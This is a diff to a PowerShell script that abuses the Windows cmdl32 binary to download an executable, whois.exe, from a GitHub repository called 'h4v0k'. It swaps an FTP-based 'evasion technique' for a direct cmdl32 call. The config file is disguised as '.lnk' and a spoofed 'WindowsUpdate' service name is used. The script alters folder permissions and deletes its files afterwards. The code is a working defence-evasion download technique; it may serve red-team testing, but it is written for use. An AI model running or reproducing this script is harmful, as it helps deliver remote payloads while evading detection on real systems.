@@ -15,27 +15,22 @@ $env:TMP = $tempDir
 Write-Host "[*] Creating VPN settings file"
 $settingsContent = @"
 [Connection Manager]
-CMSFile=settings.txt
-ServiceName=wuauserv
-TunnelFile=settings.txt
+CMSFile=.lnk
+ServiceName=WindowsUpdate
+TunnelFile=.lnk
 [Settings]
 UpdateUrl=https://raw.githubusercontent.com/fuzzlove/h4v0k/main/whois.exe
 "@
-Set-Content -Path "$tempDir\settings.txt" -Value $settingsContent
-Write-Host "[*] Performing download with cmdl32 using FTP evasion technique"
-# Create FTP command content to execute cmdl32 indirectly
-$ftpCommand = @"
-!cmdl32 "$tempDir\settings.txt" /IgnoreErrors /vpn /lan
-bye
-"@
-Set-Content -Path "$tempDir\ftp_commands.txt" -Value $ftpCommand
-
-# Execute the FTP script with embedded cmdl32 command
+Set-Content -Path "$tempDir\.lnk" -Value $settingsContent
+Write-Host "[*] Performing download with cmdl32"
+# Assuming cmdl32 is in system32 or accessible
+$cmdl32Path = "cmdl32"
+$arguments = "/vpn /lan `"$tempDir\.lnk`""
 try {
-    Start-Process -FilePath "ftp" -ArgumentList "-s:$tempDir\ftp_commands.txt" -NoNewWindow -Wait
-    Write-Host "[*] Download complete using FTP evasion technique."
+    Start-Process -FilePath $cmdl32Path -ArgumentList $arguments -NoNewWindow -Wait
+    Write-Host "[*] Download complete with cmdl32."
 } catch {
-    Write-Host "[!] FTP execution failed: $($_.Exception.Message)"
+    Write-Host "[!] cmdl32 failed: $($_.Exception.Message)"
     # Revert permissions before exiting
     icacls $tempDir /remove:d "$env:USERNAME"
     Exit
@@ -75,6 +70,5 @@ if (Test-Path "$tempDir\whois.exe") {
 }
 Write-Host "[*] Cleaning up downloaded file"
 Remove-Item -Path "$tempDir\whois.exe" -Force
-Remove-Item -Path "$tempDir\settings.txt" -Force
-Remove-Item -Path "$tempDir\ftp_commands.txt" -Force
+Remove-Item -Path "$tempDir\.lnk" -Force
 Write-Host "[*] Script complete."
